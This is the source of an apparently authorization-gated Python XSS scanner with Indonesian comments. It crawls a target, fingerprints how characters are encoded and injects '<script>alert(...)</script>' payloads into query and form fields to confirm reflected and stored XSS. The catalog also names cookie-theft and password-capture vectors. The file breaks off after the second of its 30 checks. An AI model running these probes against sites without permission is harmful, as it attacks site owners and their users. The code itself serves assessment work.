#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SATRIA XSS -- pemindai Cross-Site Scripting terfokus (30 vektor).

Struktur mengikuti satria_baru.py (katalog -> dataclass -> scanner -> adapter
runtime -> PDF -> pipeline -> CLI). Perbedaannya hanya cakupan: 30 vektor XSS.

Prinsip deteksi (anti false positive):
  * Setiap lab punya tanda tangan bukti sendiri. Bukti untuk satu lab tidak
    dipakai lab lain (ada registri klaim), jadi satu refleksi tidak dilaporkan
    sebagai beberapa temuan sekaligus.
  * Konfirmasi butuh payload yang benar-benar ter-refleksi pada konteks yang
    relevan (teks HTML, atribut, string JS, template literal, href, dsb),
    bukan sekadar "ada kata kunci di halaman".
  * Lab skenario "tag/atribut diblokir" wajib punya kontrol negatif: payload
    kontrol terbukti diblokir/di-encode, baru bypass diklaim.
  * Lab CSP wajib punya header CSP yang sesuai; lab dampak (cookie/password/
    CSRF) wajib punya vektor XSS executable + prasyarat dampaknya.
  * Semua 30 lab SELALU dijalankan. Batas request per lab mencegah lab awal
    menghabiskan anggaran sehingga pemindaian berhenti di nomor 26/27.

Penggunaan (hanya pada aset yang Anda miliki/berizin):
    python satria_XSS.py https://target --authorized
"""

from __future__ import annotations

import argparse
import hashlib
import html as html_module
import ipaddress
import json
import os
import random
import re
import socket
import string
import sys
import textwrap
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
except Exception:  # pragma: no cover
    requests = None  # type: ignore

try:
    from bs4 import BeautifulSoup
except Exception:  # pragma: no cover
    BeautifulSoup = None  # type: ignore

__version__ = "2.0.0"
USER_AGENT = "SATRIA-XSS/" + __version__ + " (+authorized XSS assessment)"

# ---------------------------------------------------------------------------
# Runtime globals (kompatibel app.py / pola satria_baru.py)
# ---------------------------------------------------------------------------
ARTIFACTS_DIR: Path = Path("artifacts")
SCRAPE_PATH = "artifacts/scrape_result.json"
FINDINGS_PATH = "artifacts/findings.json"
OUTPUT_PDF = "artifacts/laporan_kerentanan.pdf"
KIOSAPI_BASE_URL = "https://kiosapi.com/v1"
KIOSAPI_API_KEY = ""
CENSYS_TOKEN = ""
NVD_API_KEY = ""
RUN_ACTIVE_TOOLS = False
RUN_DIR_BRUTE = False
RUN_CENSYS = False
RUN_NVD = False
ENABLE_LLM = False
ALLOW_PARTIAL_TOOLS = False
ACTIVE_SCAN_AUTHORIZED = False
SCAN_DEADLINE_SECONDS = 600.0
_RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}

# ---------------------------------------------------------------------------
# Katalog 30 vektor (id, judul, key, severity)
# ---------------------------------------------------------------------------
CATALOG: list[tuple[int, str, str, str]] = [
    (1, "Reflected XSS into HTML context with nothing encoded", "reflected_html_nothing_encoded", "high"),
    (2, "Stored XSS into HTML context with nothing encoded", "stored_html_nothing_encoded", "high"),
    (3, "DOM XSS in document.write sink using source location.search", "dom_document_write_location_search", "high"),
    (4, "DOM XSS in innerHTML sink using source location.search", "dom_innerhtml_location_search", "high"),
    (5, "DOM XSS in jQuery anchor href attribute sink using location.search source", "dom_jquery_href_location_search", "high"),
    (6, "DOM XSS in jQuery selector sink using a hashchange event", "dom_jquery_selector_hashchange", "high"),
    (7, "Reflected XSS into attribute with angle brackets HTML-encoded", "reflected_attr_angle_encoded", "high"),
    (8, "Stored XSS into anchor href attribute with double quotes HTML-encoded", "stored_anchor_href_dq_encoded", "high"),
    (9, "Reflected XSS into a JavaScript string with angle brackets HTML encoded", "reflected_js_angle_encoded", "high"),
    (10, "DOM XSS in document.write sink using source location.search inside a select element", "dom_document_write_select", "high"),
    (11, "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded", "dom_angular_expression", "high"),
    (12, "Reflected DOM XSS", "reflected_dom_xss", "high"),
    (13, "Stored DOM XSS", "stored_dom_xss", "high"),
    (14, "Reflected XSS into HTML context with most tags and attributes blocked", "reflected_most_tags_blocked", "high"),
    (15, "Reflected XSS into HTML context with all tags blocked except custom ones", "reflected_custom_tags_only", "high"),
    (16, "Reflected XSS with some SVG markup allowed", "reflected_svg_allowed", "high"),
    (17, "Reflected XSS in canonical link tag", "reflected_canonical_link", "medium"),
    (18, "Reflected XSS into a JavaScript string with single quote and backslash escaped", "reflected_js_sq_backslash_escaped", "high"),
    (19, "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped", "reflected_js_complex_escaped", "high"),
    (20, "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped", "stored_onclick_complex_escaped", "high"),
    (21, "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped", "reflected_template_literal_unicode", "high"),
    (22, "Exploiting cross-site scripting to steal cookies", "xss_steal_cookies", "critical"),
    (23, "Exploiting cross-site scripting to capture passwords", "xss_capture_passwords", "critical"),
    (24, "Exploiting XSS to bypass CSRF defenses", "xss_bypass_csrf", "high"),
    (25, "Reflected XSS with AngularJS sandbox escape without strings", "reflected_angular_sandbox_no_strings", "high"),
    (26, "Reflected XSS with AngularJS sandbox escape and CSP", "reflected_angular_sandbox_csp", "high"),
    (27, "Reflected XSS with event handlers and href attributes blocked", "reflected_handlers_href_blocked", "high"),
    (28, "Reflected XSS in a JavaScript URL with some characters blocked", "reflected_js_url_blocked", "medium"),
    (29, "Reflected XSS protected by very strict CSP, with dangling markup attack", "reflected_csp_dangling_markup", "medium"),
    (30, "Reflected XSS protected by CSP, with CSP bypass", "reflected_csp_bypass", "high"),
]

CATALOG_BY_ID = {item[0]: item for item in CATALOG}

# Lab yang terbukti mengeksekusi script (dipakai lab dampak 22-24).
_EXECUTABLE_LAB_IDS = {1, 2, 7, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 27, 28, 30}

# Tag yang isinya tidak dieksekusi sebagai HTML (refleksi di sini bukan XSS).
_NON_EXEC_TEXT = {
    "title", "textarea", "style", "xmp", "noscript", "template",
    "iframe", "noembed", "noframes", "plaintext",
}

DESTRUCTIVE_PATH_RE = re.compile(
    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|"
    r"purchase|transfer|unsubscribe|empty-cart|clear-cart)(?:/|$)",
    re.I,
)

# ---------------------------------------------------------------------------
# Dataclass
# ---------------------------------------------------------------------------
@dataclass
class Response:
    status: int | None
    url: str
    text: str
    headers: dict[str, str]
    elapsed: float
    error: str | None = None

    @property
    def ok(self) -> bool:
        return self.status is not None and 200 <= self.status < 400 and not self.error

    @property
    def csp(self) -> str:
        for key, value in (self.headers or {}).items():
            if key.lower() == "content-security-policy":
                return value or ""
        return ""


@dataclass
class FormSpec:
    page_url: str
    action: str
    method: str
    fields: tuple[tuple[str, str, str], ...]
    has_password: bool = False


@dataclass
class Page:
    url: str
    text: str
    links: list[str] = field(default_factory=list)
    forms: list[FormSpec] = field(default_factory=list)
    status: int | None = None
    headers: dict[str, str] = field(default_factory=dict)


@dataclass
class Point:
    key: str
    kind: str          # query | form
    label: str
    url: str
    name: str
    original: str
    page_url: str
    method: str = "GET"
    fields: tuple[tuple[str, str, str], ...] = ()
    synthetic: bool = False


# ---------------------------------------------------------------------------
# Helper umum
# ---------------------------------------------------------------------------
def _random_token(n: int = 10) -> str:
    return "sx" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


_MARKER_RE = re.compile(r"sx[a-z0-9]{8,12}")


def _marker_of(payload: str) -> str:
    match = _MARKER_RE.search(payload or "")
    return match.group(0) if match else ""


def _slugify(value: str) -> str:
    parsed = urlparse(value or "target")
    raw = (parsed.netloc or "") + (parsed.path or "") or str(value or "target")
    slug = re.sub(r"[^A-Za-z0-9._-]+", "_", raw).strip("._")
    return slug or "target"


def _same_origin(url: str, base: str) -> bool:
    try:
        a, b = urlparse(url), urlparse(base)
        pa = a.port or (443 if a.scheme == "https" else 80)
        pb = b.port or (443 if b.scheme == "https" else 80)
        return (a.scheme, a.hostname, pa) == (b.scheme, b.hostname, pb)
    except Exception:
        return False


def _normalize_target(url: str) -> str:
    value = (url or "").strip()
    if not value:
        raise ValueError("Target URL wajib diisi.")
    if not re.match(r"^https?://", value, re.I):
        value = "https://" + value
    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Target harus berupa URL http:// atau https:// yang valid.")
    return urlunparse((parsed.scheme.lower(), parsed.netloc, parsed.path or "/", parsed.params, parsed.query, ""))


def _validate_public_target(url: str) -> None:
    host = (urlparse(url).hostname or "").rstrip(".").lower()
    if host in {"localhost", "localhost.localdomain"} or host.endswith((".localhost", ".local", ".internal", ".test", ".invalid")):
        raise ValueError("Target localhost/internal ditolak tanpa --allow-private.")
    try:
        parsed = urlparse(url)
        records = socket.getaddrinfo(host, parsed.port or (443 if parsed.scheme == "https" else 80), type=socket.SOCK_STREAM)
    except socket.gaierror as exc:
        raise ValueError("Hostname target tidak dapat di-resolve: " + str(exc)) from exc
    for item in records:
        ip = ipaddress.ip_address(item[4][0].split("%", 1)[0])
        if not ip.is_global:
            raise ValueError("Target mengarah ke IP non-publik (" + str(ip) + "); pemindaian dihentikan.")


def _is_destructive(url: str) -> bool:
    try:
        return bool(DESTRUCTIVE_PATH_RE.search(urlparse(url).path or ""))
    except Exception:
        return False


def _inline_scripts(html: str) -> list[str]:
    blocks: list[str] = []
    for match in re.finditer(r"<script\b([^>]*)>(.*?)</script\s*>", html or "", re.I | re.S):
        attrs, code = match.group(1), match.group(2)
        if re.search(r"\bsrc\s*=", attrs, re.I):
            continue
        if code and code.strip():
            blocks.append(code)
    return blocks


# ---------------------------------------------------------------------------
# Fingerprint encoder: mengukur karakter apa yang lolos mentah
# ---------------------------------------------------------------------------
_ENCODINGS: dict[str, list[str]] = {
    "<": ["&lt;", "&#60;", "&#x3c;", "&#X3C;", "\\u003c", "\\u003C", "\\x3c", "%3C", "%3c"],
    ">": ["&gt;", "&#62;", "&#x3e;", "&#X3E;", "\\u003e", "\\u003E", "\\x3e", "%3E", "%3e"],
    '"': ["&quot;", "&#34;", "&#x22;", "\\u0022", '\\"', "%22", "&QUOT;"],
    "'": ["&#39;", "&#39", "&#x27;", "&apos;", "\\u0027", "\\'", "%27"],
    "`": ["&#96;", "&#x60;", "\\u0060", "\\`", "%60"],
    "\\": ["&#92;", "&#x5c;", "\\u005c", "\\\\", "%5C", "%5c"],
    "&": ["&amp;", "&#38;", "&#x26;", "%26"],
}


def _match_encoding(tail: str, pos: int, char: str) -> tuple[str, int]:
    if pos < len(tail) and tail[pos] == char:
        return "raw", 1
    for encoded in _ENCODINGS.get(char, []):
        if tail.startswith(encoded, pos):
            return "encoded", len(encoded)
    return "removed", 1


# ---------------------------------------------------------------------------
# Analisis konteks refleksi (inti anti false-positive)
# ---------------------------------------------------------------------------
def _parse_attrs(segment: str) -> list[tuple[str, str, str, bool]]:
    """Parse atribut pada potongan tag. Hasil: (nama, nilai, kutip, sudah_tertutup)."""
    match = re.match(r"<\s*[A-Za-z][\w:.-]*", segment)
    index = match.end() if match else 0
    out: list[tuple[str, str, str, bool]] = []
    length = len(segment)
    while index < length:
        while index < length and segment[index] in " \t\r\n/":
            index += 1
        if index >= length:
            break
        start = index
        while index < length and (segment[index].isalnum() or segment[index] in "-_:."):
            index += 1
        if index == start:
            index += 1
            continue
        name = segment[start:index].lower()
        while index < length and segment[index] in " \t\r\n":
            index += 1
        value, quote, closed = "", "", True
        if index < length and segment[index] == "=":
            index += 1
            while index < length and segment[index] in " \t\r\n":
                index += 1
            if index < length and segment[index] in "\"'":
                quote = segment[index]
                stop = segment.find(quote, index + 1)
                if stop == -1:
                    value = segment[index + 1:]
                    index = length
                    closed = False
                else:
                    value = segment[index + 1:stop]
                    index = stop + 1
            else:
                stop = index
                while stop < length and segment[stop] not in " \t\r\n>":
                    stop += 1
                value = segment[index:stop]
                index = stop
        out.append((name, value, quote, closed))
    return out


def _js_quote_state(segment: str) -> tuple[str, bool]:
    """Perkirakan state kutip JS pada akhir potongan skrip."""
    state = "code"
    index = 0
    length = len(segment)
    while index < length:
        char = segment[index]
        if state == "code":
            if char == "/" and index + 1 < length and segment[index + 1] == "/":
                newline = segment.find("\n", index)
                index = length if newline == -1 else newline + 1
                continue
            if char == "/" and index + 1 < length and segment[index + 1] == "*":
                close = segment.find("*/", index + 2)
                index = length if close == -1 else close + 2
                continue
            if char in "'\"`":
                state = char
        else:
            if char == "\\":
                index += 2
                continue
            if char == state:
                state = "code"
        index += 1
    if state == "'":
        return "sq", False
    if state == '"':
        return "dq", False
    if state == "`":
        return "tpl", True
    return "code", False


def _context_at(body: str, pos: int) -> dict[str, Any]:
    open_script = body.rfind("<script", 0, pos)
    close_script = body.rfind("</script", 0, pos)
    in_script = open_script != -1 and open_script > close_script
    lt = body.rfind("<", 0, pos)
    gt = body.rfind(">", 0, pos)
    in_tag = lt > gt and not body.startswith("</", lt)
    in_comment = body.rfind("<!--", 0, pos) > body.rfind("-->", 0, pos)

    tag_name = ""
    parent_tag = ""
    attr_name = ""
    attr_quote = ""
    in_attr = False
    js_state = "code"
    in_template = False

    if in_script:
        parent_tag = "script"
        tag_end = body.find(">", open_script, pos)
        segment = body[tag_end + 1:pos] if tag_end != -1 else body[open_script:pos]
        js_state, in_template = _js_quote_state(segment)
    elif in_tag:
        match = re.match(r"<\s*([A-Za-z][\w:.-]*)", body[lt:lt + 80])
        tag_name = match.group(1).lower() if match else ""
        attrs = _parse_attrs(body[lt:pos])
        if attrs:
            name, _value, quote, closed = attrs[-1]
            if not closed:
                in_attr = True
                attr_name = name
                attr_quote = quote
        parent_tag = tag_name
    else:
        match = re.match(r"<\s*([A-Za-z][\w:.-]*)", body[lt:lt + 80]) if lt != -1 else None
        parent_tag = match.group(1).lower() if match else ""

    return {
        "pos": pos,
        "in_script": in_script,
        "in_tag": in_tag,
        "in_attr": in_attr,
        "attr_name": attr_name,
        "attr_quote": attr_quote,
        "tag_name": tag_name,
        "parent_tag": parent_tag,
        "js": js_state,
        "in_template": in_template,
        "in_comment": in_comment,
    }


def _analyze_reflection(body: str, payload: str, marker: str) -> list[dict[str, Any]]:
    """Cari semua kemungkinan posisi refleksi payload dan konteksnya."""
    if not body or not payload or not marker:
        return []
    starts: list[int] = []
    exact_index = body.find(payload)
    if exact_index != -1:
        starts.append(exact_index)
    else:
        marker_offset = payload.find(marker)
        if marker_offset < 0:
            return []
        for match in re.finditer(re.escape(marker), body):
            candidate = match.start() - marker_offset
            if candidate >= 0:
                starts.append(candidate)
    result: list[dict[str, Any]] = []
    seen: set[int] = set()
    for start in starts[:8]:
        if start in seen:
            continue
        seen.add(start)
        marker_offset = payload.find(marker)
        pos = start + max(0, marker_offset)
        ctx = _context_at(body, pos)
        ctx["payload_start"] = start
        ctx["exact"] = body.startswith(payload, start)
        result.append(ctx)
    return result


# ---------------------------------------------------------------------------
# CSP helper
# ---------------------------------------------------------------------------
def _csp_directives(csp: str) -> dict[str, list[str]]:
    directives: dict[str, list[str]] = {}
    for part in (csp or "").split(";"):
        bits = part.strip().split()
        if not bits:
            continue
        directives.setdefault(bits[0].lower(), bits[1:])
    return directives


def _csp_script_sources(csp: str) -> list[str]:
    directives = _csp_directives(csp)
    return list(directives.get("script-src") or directives.get("default-src") or [])


def _csp_is_strict(csp: str) -> bool:
    sources = _csp_script_sources(csp)
    if not sources:
        return False
    joined = " ".join(sources).lower()
    if "'unsafe-inline'" in joined or "*" in sources:
        return False
    hosts = [s for s in sources if not s.startswith("'") and s not in ("data:", "blob:", "http:", "https:")]
    return not hosts


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------
class SatriaXSSScanner:
    # Batas request per lab: menjamin lab 26-30 tetap kebagian anggaran.
    LAB_REQUEST_CAP = 18

    def __init__(
        self,
        target_url: str,
        *,
        authorized: bool = False,
        allow_private: bool = False,
        max_pages: int = 10,
        max_points: int = 24,
        max_requests: int = 900,
        timeout: float = 8.0,
        time_delay: float = 0.0,
        seed_html: str | None = None,
    ) -> None:
        self.target_url = _normalize_target(target_url)
        if not authorized:
            raise ValueError("Pengujian aktif memerlukan otorisasi (authorized=True).")
        if not allow_private:
            _validate_public_target(self.target_url)
        if requests is None:
            raise RuntimeError("Library 'requests' belum terpasang.")

        self.max_pages = max(1, min(int(max_pages), 40))
        self.max_points = max(4, min(int(max_points), 80))
        self.max_requests = max(120, min(int(max_requests), 5000))
        self.timeout = max(3.0, min(float(timeout), 30.0))
        self.time_delay = max(0.0, min(float(time_delay), 5.0))
        self.seed_html = seed_html or None
        self.request_count = 0
        self.started = time.monotonic()
        try:
            self.deadline_seconds = float(globals().get("SCAN_DEADLINE_SECONDS") or 600.0)
        except (TypeError, ValueError):
            self.deadline_seconds = 600.0

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cache-Control": "no-cache",
        })
        self.pages: list[Page] = []
        self.points: list[Point] = []
        self.stats: dict[str, Any] = {"pages_fetched": 0, "requests": 0, "errors": []}
        self._script_srcs: list[str] = []
        self._dom_cache: list[tuple[str, str]] | None = None
        self._set_cookies: list[str] = []
        self._csp_header = ""

        self._probe_cache: dict[str, tuple[bool, str, dict]] = {}
        self._probe_miss: set[str] = set()
        self._preferred: Point | None = None
        self._fp: dict[str, Any] | None = None
        self._tag_cache: dict[str, bool] = {}
        self._claims: dict[str, bool] = {}
        self._lab_id = 0
        self._lab_used = 0
        self._results: dict[int, dict[str, Any]] = {}

    # ---- Budget ----
    def _deadline_hit(self) -> bool:
        return (time.monotonic() - self.started) >= self.deadline_seconds

    def _lab_budget(self) -> bool:
        if self._lab_used >= self.LAB_REQUEST_CAP:
            return False
        remaining_labs = max(0, len(CATALOG) - self._lab_id)
        if self.request_count + remaining_labs * 3 >= self.max_requests:
            return False
        return not self._deadline_hit()

    # ---- HTTP ----
    def _same_origin(self, url: str) -> bool:
        return _same_origin(url, self.target_url)

    def _request(
        self,
        method: str,
        url: str,
        *,
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
        allow_redirects: bool = True,
    ) -> Response:
        if self.request_count >= self.max_requests:
            return Response(None, url, "", {}, 0.0, "budget_exceeded")
        if self._deadline_hit():
            return Response(None, url, "", {}, 0.0, "deadline_exceeded")
        self.request_count += 1
        self._lab_used += 1
        self.stats["requests"] = self.request_count
        started = time.monotonic()
        try:
            raw = self.session.request(
                method.upper(), url, params=params, data=data,
                timeout=self.timeout, allow_redirects=allow_redirects, verify=True,
            )
            elapsed = time.monotonic() - started
            headers = {str(k): str(v) for k, v in (raw.headers or {}).items()}
            text = raw.text or ""
            if len(text) > 800_000:
                text = text[:800_000]
            if not self._csp_header:
                self._csp_header = headers.get("Content-Security-Policy") or headers.get("content-security-policy") or ""
            set_cookie = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
            if set_cookie:
                self._set_cookies.append(set_cookie)
            return Response(raw.status_code, str(raw.url), text, headers, elapsed)
        except Exception as exc:
            elapsed = time.monotonic() - started
            message = type(exc).__name__ + ": " + str(exc)
            if len(self.stats["errors"]) < 40:
                self.stats["errors"].append(message[:200])
            return Response(None, url, "", {}, elapsed, message)

    def _get(self, url: str, params: dict[str, str] | None = None) -> Response:
        return self._request("GET", url, params=params)

    def _post(self, url: str, data: dict[str, str] | None = None) -> Response:
        return self._request("POST", url, data=data)

    # ---- Crawl ----
    def _crawl(self) -> None:
        seen: set[str] = set()
        if self.seed_html:
            seeded = self._parse_page(self.target_url, Response(200, self.target_url, self.seed_html, {}, 0.0))
            self.pages.append(seeded)
            seen.add(self.target_url.split("#", 1)[0])

        queue: deque[str] = deque([self.target_url])
        while queue and len(self.pages) < self.max_pages and not self._deadline_hit():
            url = queue.popleft()
            canon = url.split("#", 1)[0]
            if canon in seen or not self._same_origin(canon) or _is_destructive(canon):
                continue
            seen.add(canon)
            response = self._get(canon)
            if not response.text and response.error:
                continue
            self.stats["pages_fetched"] += 1
            page = self._parse_page(canon, response)
            self.pages.append(page)
            for link in page.links:
                if link not in seen:
                    queue.append(link)

        if not self.pages:
            response = self._get(self.target_url)
            self.pages.append(self._parse_page(self.target_url, response))

    def _parse_page(self, url: str, response: Response) -> Page:
        text = response.text or ""
        links: list[str] = []
        forms: list[FormSpec] = []
        if BeautifulSoup is None:
            return Page(url=url, text=text, status=response.status, headers=response.headers or {})
        try:
            soup = BeautifulSoup(text, "html.parser")
            for anchor in soup.find_all("a", href=True):
                href = (anchor.get("href") or "").strip()
                if not href or href.startswith(("javascript:", "mailto:", "tel:", "#")):
                    continue
                absolute = urljoin(url, href).split("#", 1)[0]
                if self._same_origin(absolute):
                    links.append(absolute)
            for script in soup.find_all("script", src=True):
                src = (script.get("src") or "").strip()
                if src:
                    absolute_src = urljoin(url, src)
                    if self._same_origin(absolute_src) and absolute_src not in self._script_srcs:
                        self._script_srcs.append(absolute_src)
            for form in soup.find_all("form"):
                action = urljoin(url, (form.get("action") or url).strip() or url)
                if not self._same_origin(action) or _is_destructive(action):
                    continue
                method = (form.get("method") or "GET").upper()
                if method not in ("GET", "POST"):
                    method = "GET"
                fields: list[tuple[str, str, str]] = []
                has_password = False
                for element in form.find_all(["input", "textarea", "select"]):
                    name = element.get("name")
                    if not name:
                        continue
                    input_type = (element.get("type") or element.name or "text").lower()
                    if input_type in ("submit", "button", "image", "reset", "file"):
                        continue
                    if input_type == "password":
                        has_password = True
                    value = element.get("value") or ""
                    if element.name == "textarea":
                        value = element.text or value
                    fields.append((str(name), str(value), input_type))
                forms.append(FormSpec(page_url=url, action=action, method=method,
                                      fields=tuple(fields), has_password=has_password))
        except Exception:
            pass

        unique_links: list[str] = []
        seen_links: set[str] = set()
        for link in links:
            if link not in seen_links:
                seen_links.add(link)
                unique_links.append(link)
        return Page(url=url, text=text, links=unique_links[:200], forms=forms[:50],
                    status=response.status, headers=response.headers or {})

    def _discover_points(self) -> None:
        points: list[Point] = []
        seen: set[str] = set()

        def add(point: Point) -> None:
            if point.key in seen:
                return
            seen.add(point.key)
            points.append(point)

        for page in self.pages:
            try:
                parsed = urlparse(page.url)
                for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                    add(Point(key="q|" + parsed.path + "|" + name, kind="query", label="query:" + name,
                              url=page.url, name=name, original=value, page_url=page.url, method="GET"))
            except Exception:
                pass
            for link in page.links:
                try:
                    parsed = urlparse(link)
                    for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                        add(Point(key="l|" + parsed.path + "|" + name, kind="query", label="query:" + name,
                                  url=link, name=name, original=value, page_url=page.url, method="GET"))
                except Exception:
                    pass
            for form in page.forms:
                for name, value, _input_type in form.fields:
                    add(Point(key="f|" + form.action + "|" + form.method + "|" + name, kind="form",
                              label="form:" + name, url=form.action, name=name, original=value,
                              page_url=page.url, method=form.method, fields=form.fields))

        if not points:
            points.append(Point(key="synthetic|" + self.target_url + "|q", kind="query", label="query:q",
                                url=self.target_url, name="q", original="", page_url=self.target_url,
                                method="GET", synthetic=True))

        def score(point: Point) -> int:
            name = point.name.lower()
            value = 0
            if name in ("q", "search", "query", "s", "term", "keyword", "name"):
                value -= 40
            if point.kind == "query":
                value -= 4
            if any(key in name for key in ("comment", "message", "content", "body", "text",
                                           "url", "website", "redirect", "next", "page")):
                value -= 8
            return value

        points.sort(key=score)
        self.points = points[:self.max_points]

    def _send_point(self, point: Point, value: str) -> Response:
        if point.kind == "query":
            try:
                parsed = urlparse(point.url)
                pairs = [(k, value if k == point.name else v)
                         for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
                if not any(k == point.name for k, _ in pairs):
                    pairs.append((point.name, value))
                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                                      urlencode(pairs, doseq=True), parsed.fragment))
                return self._get(new_url)
            except Exception as exc:
                return Response(None, point.url, "", {}, 0.0, str(exc))
        data: dict[str, str] = {}
        for name, original, _input_type in point.fields:
            data[name] = original
        data[point.name] = value
        if point.method == "POST":
            return self._post(point.url, data=data)
        return self._get(point.url, params=data)

    # ---- Probe engine ----
    def _candidate_points(self) -> list[Point]:
        ordered: list[Point] = []
        if self._preferred is not None and self._preferred in self.points:
            ordered.append(self._preferred)

        def score(point: Point) -> int:
            name = point.name.lower()
            value = 0
            if name in ("q", "search", "query", "s", "term", "keyword"):
                value -= 40
            if point.kind == "query":
                value -= 5
            return value

        for point in sorted(self.points, key=score):
            if point not in ordered:
                ordered.append(point)
        return ordered

    def _probe(self, payload: str) -> tuple[bool, str, dict[str, Any]]:
        """Kirim payload ke titik refleksi terbaik; hasil di-cache per payload."""
        if payload in self._probe_cache:
            return self._probe_cache[payload]
        if payload in self._probe_miss:
            return False, "", {}
        marker = _marker_of(payload)
        if not marker:
            self._probe_miss.add(payload)
            return False, "", {}

        tried = 0
        for point in self._candidate_points():
            if not self._lab_budget():
                break
            response = self._send_point(point, payload)
            body = response.text or ""
            if marker in body:
                self._preferred = point
                meta = {"point": point.label, "url": response.url or point.url, "key": point.key}
                self._probe_cache[payload] = (True, body, meta)
                return self._probe_cache[payload]
            tried += 1
            if tried >= 3:
                break
        self._probe_miss.add(payload)
        return False, "", {}

    def _ensure_fingerprint(self) -> dict[str, Any]:
        if self._fp is not None:
            return self._fp
        token = _random_token()
        order = ['"', "<", ">", "`", "\\", "'", "&"]
        probe = token + '"<>' + "`" + "\\" + "'" + "&"
        ok, body, meta = self._probe(probe)
        fingerprint: dict[str, Any] = {}
        if ok:
            index = body.find(token)
            tail = body[index + len(token): index + len(token) + 48]
            cursor = 0
            for char in order:
                result, used = _match_encoding(tail, cursor, char)
                fingerprint[char] = result
                cursor += used
        else:
            for char in order:
                fingerprint[char] = "absent"
        fingerprint["_point"] = meta.get("point")
        fingerprint["_url"] = meta.get("url")
        self._fp = fingerprint
        return fingerprint

    def _fp_is(self, char: str, state: str) -> bool:
        return self._ensure_fingerprint().get(char) == state

    def _claim(self, signature: str) -> bool:
        if signature in self._claims:
            return False
        self._claims[signature] = True
        return True

    @staticmethod
    def _no(reason: str) -> tuple[bool, str, dict[str, Any]]:
        return False, reason, {}

    # ---- Form/stored helper ----
    def _form_points(self) -> list[Point]:
        points = [p for p in self.points if p.kind == "form"]

        def score(point: Point) -> int:
            name = point.name.lower()
            value = 0
            if any(key in name for key in ("comment", "message", "feedback", "post", "content",
                                           "body", "text", "name", "website", "url", "email", "title")):
                value -= 20
            if any(key in name for key in ("password", "passwd", "login", "user")):
                value += 30
            return value

        return sorted(points, key=score)

    def _recheck_urls(self, point: Point) -> list[str]:
        urls: list[str] = []
        for url in (point.page_url, point.url):
            if url and url not in urls:
                urls.append(url)
        for page in self.pages:
            if page.url not in urls and urlparse(page.url).path == urlparse(point.page_url).path:
                urls.append(page.url)
        return urls[:3]

    def _stored_probe(self, payload: str, checker: Callable[[str, str, str], bool]) -> tuple[bool, str, dict[str, Any]]:
        marker = _marker_of(payload)
        if not marker:
            return self._no("Marker payload tidak valid.")
        for point in self._form_points()[:4]:
            if not self._lab_budget():
                break
            self._send_point(point, payload)
            for url in self._recheck_urls(point):
                if not self._lab_budget():
                    break
                response = self._get(url)
                body = response.text or ""
                if marker in body and checker(body, payload, marker):
                    return True, (
                        "Payload tersimpan lalu ter-render ulang di " + url
                        + " (form " + point.label + ")."
                    ), {"point": point.label, "url": url, "marker": marker}
        return self._no("Tidak ada bukti persistensi (stored) pada form yang diuji.")

    # ---- DOM helper ----
    def _dom_blocks(self) -> list[tuple[str, str]]:
        if self._dom_cache is not None:
            return self._dom_cache
        blocks: list[tuple[str, str]] = []
        for page in self.pages:
            for code in _inline_scripts(page.text or ""):
                blocks.append((page.url, code))
        for src in self._script_srcs[:4]:
            if not self._lab_budget():
                break
            response = self._get(src)
            if response.text:
                blocks.append((src, response.text))
        self._dom_cache = blocks
        return blocks

    def _angular_scopes(self) -> list[tuple[str, int, int]]:
        scopes: list[tuple[str, int, int]] = []
        for page in self.pages:
            body = page.text or ""
            for match in re.finditer(r"<([a-zA-Z][\w-]*)[^>]*\bng-app\b[^>]*>", body):
                tag = match.group(1).lower()
                end = body.find("</" + tag, match.end())
                scopes.append((page.url, match.end(), end if end != -1 else len(body)))
        return scopes

    def _angular_present(self) -> bool:
        return bool(self._angular_scopes())

    # =======================================================================
    # 30 lab
    # =======================================================================
    def _lab_01(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "<script>alert('" + marker + "')</script>"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload <script> tidak ter-refleksi pada titik uji yang ditemukan.")
        if not (self._fp_is("<", "raw") and self._fp_is(">", "raw")):
            return self._no("Karakter < > di-encode/dihapus, sehingga tag <script> mentah tidak dapat dieksekusi.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or ctx["in_script"] or ctx["in_tag"] or ctx["in_comment"]:
                continue
            if ctx["parent_tag"] in _NON_EXEC_TEXT:
                continue
            if self._claim("html_text:" + str(meta.get("key"))):
                return True, "Payload <script> ter-refleksi mentah pada konteks teks HTML di " + str(meta.get("url")) + ".", {
                    "context": "html_text", **meta}
        return self._no("Refleksi ada, tetapi bukan <script> mentah pada konteks teks HTML yang dapat dieksekusi.")

    def _lab_02(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "<script>alert('" + marker + "')</script>"

        def checker(body: str, _payload: str, mk: str) -> bool:
            for ctx in _analyze_reflection(body, payload, mk):
                if ctx["exact"] and not ctx["in_script"] and not ctx["in_tag"] and not ctx["in_comment"]:
                    if ctx["parent_tag"] not in _NON_EXEC_TEXT:
                        return True
            return False

        return self._stored_probe(payload, checker)

